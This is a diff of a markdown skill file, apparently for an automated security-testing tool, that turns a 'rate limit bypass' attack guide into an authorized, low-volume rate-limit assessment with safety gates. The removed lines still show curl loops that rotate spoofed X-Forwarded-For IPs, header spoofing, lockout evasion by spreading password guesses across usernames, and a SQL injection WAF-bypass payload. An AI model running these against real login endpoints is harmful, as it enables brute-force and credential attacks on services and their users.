@@ -1,146 +1,64 @@
 ---
 name: attack-rate-limit-bypass
-description: "Rate limit bypass testing — XFF rotation, case variation, method switching, header manipulation"
+description: "Assess rate-limit enforcement and identity keying with low-volume, policy-compliant tests"
 category: "web-application"
-version: "1.0"
-author: "cyberstrike-official"
-tags:
-  - rate-limit
-  - brute-force
-  - web
-  - bypass
-  - attack
-tech_stack:
-  - web
-cwe_ids:
-  - CWE-307
-  - CWE-770
-chains_with:
-  - attack-race-condition
-prerequisites: []
-severity_boost:
-  attack-race-condition: "Rate limit bypass + race condition = unlimited exploitation"
+version: "1.1.0"
+author: "CyberStrike contributors; consolidated with upstream attribution"
+tags: [rate-limit, abuse-prevention, authentication, api]
+tech_stack: [http, api, web]
+cwe_ids: [CWE-307]
+chains_with: [attack-brute-force, attack-api-misconfig, attack-triage-validation]
+prerequisites:
+  - "Explicit authorization for rate-limit testing"
+  - "Known test account, documented request budget, and stop threshold"
+sources:
+  - "https://github.com/uphiago/recon-skills"
+  - "https://owasp.org/www-project-web-security-testing-guide/"
 ---
 
-# Rate Limit Bypass
+# Rate-Limit Enforcement Assessment
 
 ## Objective
 
-Bypass rate limiting mechanisms to enable brute-force attacks, credential stuffing, or abuse of rate-limited functionality.
+Determine whether a security-sensitive action is protected by effective server-side rate limits and whether limits are keyed to the appropriate identity and resource. Do not attempt to overwhelm the service or bypass limits using real-user identities.
 
-## Testing Methodology
+## Safety gates
 
-### Phase 1: Automated Bypass Testing
+- Confirm the exact endpoint and permitted request count.
+- Use a dedicated account and low-volume tests; stop at the first lockout, CAPTCHA, throttling response, or service instability.
+- Do not rotate real IPs, use proxy networks, or automate credential guessing. Header variations should be limited to verifying documented proxy trust behavior, not evading protections at scale.
+- Never test password spraying or credential stuffing under this skill.
 
-```bash
-# Full bypass test suite (5 techniques)
-attack_script rate_limit_bypass "https://TARGET/api/login" \
-  --method POST \
-  -H "Content-Type:application/json" \
-  -d '{"email":"test@test.com","password":"test"}' \
-  --count 20 \
-  --json-output
-```
+## Procedure
 
-Tests automatically:
-1. X-Forwarded-For IP rotation
-2. URL case variation
-3. HTTP method switching
-4. Random query parameter injection
-5. Header-based bypasses
+### 1. Define the protected action
 
-### Phase 2: X-Forwarded-For Rotation
+Identify login, password reset, OTP, invitation, coupon, search, export, or API operation. Record the expected policy: requests per identity, IP, device, resource, or time window.
 
-```bash
-# Rotate source IP via headers
-for i in $(seq 1 50); do
-  IP="$((RANDOM%254+1)).$((RANDOM%254+1)).$((RANDOM%254+1)).$((RANDOM%254+1))"
-  curl -s -o /dev/null -w "%{http_code} " \
-    -X POST https://TARGET/api/login \
-    -H "X-Forwarded-For: $IP" \
-    -H "X-Real-IP: $IP" \
-    -H "X-Client-IP: $IP" \
-    -d '{"email":"test@test.com","password":"guess"}'
-done
-```
+### 2. Establish a baseline
 
-### Phase 3: URL Manipulation
+Make a small number of normal requests with a controlled account and record status, response headers, retry guidance, CAPTCHA/lockout behavior, and timing. Confirm the test endpoint is not shared with real users.
 
-```bash
-# Path case variation
-curl https://TARGET/API/LOGIN
-curl https://TARGET/Api/Login
+### 3. Check enforcement consistency
 
-# Trailing slash/dot
-curl https://TARGET/api/login/
-curl https://TARGET/api/login/.
+Within the approved budget, compare equivalent requests across relevant dimensions: authenticated vs anonymous, account vs IP, alternate HTTP methods where supported, normalized path variants, and different test-owned accounts. Do not assume headers such as `X-Forwarded-For` are trusted or safe to manipulate; verify proxy configuration only when explicitly permitted.
 
-# Double slash
-curl https://TARGET//api//login
+### 4. Validate limit state
 
-# Random query params (new cache key)
-curl "https://TARGET/api/login?_=$(date +%s)"
-```
+Confirm whether the server actually blocks or slows requests after the allowed threshold and whether the window resets as documented. Distinguish edge/CDN throttling from application-level enforcement. Do not continue after a limit is reached merely to search for a bypass.
 
-### Phase 4: Header Bypasses
+### 5. Assess impact
 
-```bash
-curl -X POST https://TARGET/api/login \
-  -H "X-Forwarded-For: 127.0.0.1"
+Explain the security control being bypassed and the bounded action enabled, such as excessive OTP requests or repeated password attempts. Missing limits on a low-risk endpoint are not automatically a vulnerability; severity depends on reachable abuse and mitigations.
 
-curl -X POST https://TARGET/api/login \
-  -H "X-Forwarded-Host: localhost"
+## Common false positives
 
-curl -X POST https://TARGET/api/login \
-  -H "X-Original-URL: /api/login"
+- A rate limit exists at a gateway not visible from the response.
+- A test did not reach the configured threshold.
+- A 429 response comes from an intermediary rather than the application.
+- Different endpoints intentionally have different budgets.
+- A theoretical header bypass was not verified with an approved proxy configuration.
 
-curl -X POST https://TARGET/api/login \
-  -H "X-Custom-IP-Authorization: 127.0.0.1"
-```
+## Output contract
 
-### Phase 5: Account Lockout Bypass
-
-```bash
-# Distribute across usernames
-for user in user1 user2 user3; do
-  curl -X POST https://TARGET/api/login \
-    -d "{\"email\":\"$user@test.com\",\"password\":\"common_password\"}"
-done
-
-# IP rotation + distributed usernames = bypass
-```
-
-### Phase 6: WAF Bypass + Rate Limit
-
-```bash
-# Encode payloads to avoid WAF detection
-attack_script waf_bypass "admin' OR 1=1--" --test-url "https://TARGET/api/login" --param password
-```
-
-## What Constitutes a Finding
-
-| Finding | Severity |
-|---------|----------|
-| Rate limit bypass on login/auth endpoint | High (P2) |
-| Rate limit bypass on password reset | High (P2) |
-| Rate limit bypass on OTP/2FA verification | Critical (P1) |
-| Rate limit bypass on financial operations | Critical (P1) |
-| Rate limit bypass on non-sensitive endpoint | Low (P4) |
-
-## Evidence Requirements
-
-- Endpoint tested
-- Normal rate limit behavior (429 after N requests)
-- Bypass technique used
-- Successful requests beyond the limit
-- Count of requests that bypassed the limit
-
-## Tools
-
-- `attack_script rate_limit_bypass` — automated 5-technique bypass testing
-- `attack_script waf_bypass` — encoding variants for WAF bypass
-
-## References
-
-- [OWASP: Rate Limiting](https://owasp.org/www-community/controls/Rate_Limiting)
-- [HackerOne: Rate Limit Bypass](https://www.hackerone.com/vulnerability-management/rate-limiting-bypass-techniques)
+Return `endpoint`, `action_type`, `test_account`, `request_budget`, `limit_key_hypothesis`, `threshold_observed`, `retry_behavior`, `impact`, `stop_reason`, `confidence`, and redacted evidence.
